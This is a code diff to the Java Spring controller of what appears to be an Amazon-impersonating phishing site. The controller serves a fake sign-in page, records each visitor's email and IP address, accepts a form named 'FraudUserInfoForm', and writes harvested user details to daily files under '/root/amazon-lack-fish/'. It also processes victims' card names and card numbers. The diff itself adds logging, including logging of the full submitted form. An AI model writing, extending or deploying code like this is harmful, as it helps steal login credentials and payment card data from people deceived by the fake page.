@@ -12,6 +12,7 @@ import com.kidd.amazon.common.IpUtils;
 import com.kidd.amazon.model.FraudUserInfoForm;
 import com.kidd.amazon.model.UserInfoForm;
 import com.kidd.amazon.task.AsyncTask;
+import lombok.extern.slf4j.Slf4j;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.stereotype.Controller;
 import org.springframework.ui.Model;
@@ -29,6 +30,7 @@ import java.util.*;
 
 
 @Controller
+@Slf4j
 public class AmazonController {
     @Autowired
     private HttpServletRequest request;
@@ -42,22 +44,24 @@ public class AmazonController {
 
     @GetMapping("/signin")
     public Object signin(@RequestHeader("User-Agent") String ua, @RequestHeader("Accept-Language") String al,@RequestParam(value = "email",defaultValue = "null") String email, Model model) {
-        String ip = IpUtils.getIpAddress(request);
-        String path = "/root/countClickLink.txt";
-        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
-        String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd HH:mm:ss");
-        if (!FileUtil.exist(path)) {
-            FileUtil.newFile(path);
-        }
-        FileAppender fileAppender = new FileAppender(FileUtil.file(path), 1000, true);
-        fileAppender.append(timeStr+":"+email+"|"+ip);
-        fileAppender.flush();
+            log.info("test log");
+            String ip = IpUtils.getIpAddress(request);
+            String path = "/root/countClickLink.txt";
+            LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
+            String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd HH:mm:ss");
+            if (!FileUtil.exist(path)) {
+                FileUtil.newFile(path);
+            }
+            FileAppender fileAppender = new FileAppender(FileUtil.file(path), 1000, true);
+            fileAppender.append(timeStr+":"+email+"|"+ip);
+            fileAppender.flush();
         return "login";
     }
 
     @PostMapping("/kiddSigin")
     @ResponseBody
-    public Object signin3(FraudUserInfoForm form1, @RequestHeader("User-Agent") String agent, @RequestHeader("Accept-Language") String al, Model model) {
+    public Object kiddSigin(FraudUserInfoForm form1, @RequestHeader("User-Agent") String agent, @RequestHeader("Accept-Language") String al, Model model) {
+        log.info(JSON.toJSONString(form1));
         LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
         String timeStr = DateUtil.format(localDateTime, "yyyy/MM/dd HH:mm:ss");
         Map<String, String[]> params = request.getParameterMap();
@@ -108,7 +112,6 @@ public class AmazonController {
         }
         LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
         String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd");
-        System.out.println("userInfoMap:"+ JSON.toJSONString(userInfoMap));
         asyncTask.asyncWriteMap(String.format("/root/amazon-lack-fish/%s.txt", timeStr), userInfoMap);
         Map map = new HashMap();
         map.put("data", "ok");
@@ -129,11 +132,6 @@ public class AmazonController {
         if(StringUtils.isEmpty(cardName)){
             cardName="*****";
         }
-//        if(null==form.getCxdi()){
-//            form.setCxdi("*******");
-//        }
-//        model.addAttribute("cardNo", form.getCxdi().substring(form.getCxdi().length() - 4, form.getCxdi().length()));
-//        model.addAttribute("cardName", form.getNameCard());
         model.addAttribute("dateTime", timeStr);
         model.addAttribute("cardName", cardName);
         model.addAttribute("cardNo",cardNo.substring(cardNo.length() - 4, cardNo.length()));
